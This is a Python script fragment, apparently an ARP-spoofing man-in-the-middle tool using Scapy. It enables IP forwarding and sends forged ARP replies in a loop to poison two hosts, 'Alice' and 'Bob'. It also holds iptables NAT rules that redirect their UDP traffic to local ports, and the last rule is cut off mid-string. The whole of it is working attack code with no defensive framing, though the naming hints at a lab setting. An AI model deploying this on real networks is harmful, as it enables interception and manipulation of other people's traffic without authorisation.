def mfunc_ip_forward(forward=None):
    if forward == None:
        subprocess.call('cat /proc/sys/net/ipv4/ip_forward', shell=True)
    elif forward == True:
        print('[*] Enabling ip forwarding')
        subprocess.call('echo 1 > /proc/sys/net/ipv4/ip_forward', shell=True)
    elif forward == False:
        print('[*] Disabling ip forwarding')
        subprocess.call('echo 0 > /proc/sys/net/ipv4/ip_forward', shell=True)
    else:
        pass

def mfunc_spoof_alice_bob():
    poison_alice = ARP(op=2, psrc=bob_ip, pdst=alice_ip, hwdst=alice_mac)
    poison_bob = ARP(op=2, psrc=alice_ip, pdst=bob_ip, hwdst=bob_mac)

    while True:
        send(poison_alice)
        send(poison_bob)

        time.sleep(2)
        

mstr_iptables_port_forward_alice = 'iptables -t nat -I PREROUTING --src 192.168.10.50 --dst 192.168.10.52 -p udp --dport 9999 -j REDIRECT --to-ports 6666'
mstr_iptables_port_forward_bob = 'iptables -t nat -I PREROUTING --src 192.168.10.52 --dst 192.168.10.50 -p udp --dport 8888 -j REDIRECT --to-ports '
